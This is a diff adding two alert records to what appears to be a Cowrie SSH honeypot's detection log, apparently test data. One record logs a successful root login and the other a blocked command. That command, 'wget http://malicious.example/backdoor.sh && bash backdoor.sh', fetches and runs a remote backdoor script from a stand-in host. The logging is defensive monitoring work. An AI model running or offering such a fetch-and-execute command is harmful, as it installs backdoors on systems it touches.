@@ -3231,5 +3231,64 @@
     },
     "detection_source": "pure_python",
     "actor_class": "unknown"
+  },
+  {
+    "alert_id": "ALERT-2026-09-17T21:54:52.045365Z-4956",
+    "timestamp": "2026-09-17T21:54:52.045365Z",
+    "severity": "CRITICAL",
+    "threat_type": "SUCCESSFUL_INTRUSION",
+    "source_ip": "203.0.113.132",
+    "description": "Successful login from 203.0.113.132 to honeypot",
+    "recommended_action": "Immediate response required",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.132",
+        "timestamp": "2026-09-17T21:54:52.122015",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.132",
+        "severity": "CRITICAL",
+        "reason": "Blocked in Cowrie honeypot: Successful intrusion attempt",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.132"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "session": "react-ui-test-3922ccac",
+      "protocol": "ssh"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-17T21:55:27.556022Z-5914",
+    "timestamp": "2026-09-17T21:55:27.556022Z",
+    "severity": "HIGH",
+    "threat_type": "MALICIOUS_COMMAND",
+    "source_ip": "203.0.113.71",
+    "description": "Malicious command detected: wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+    "recommended_action": "Block IP and investigate",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.71",
+        "timestamp": "2026-09-17T21:55:27.562192",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.71",
+        "severity": "HIGH",
+        "reason": "Malicious command: wget http://malicious.example/backdoor.sh && bash ",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.71"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.command.input",
+      "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+      "session": "react-ui-test-8b775e60"
+    }
   }
 ]
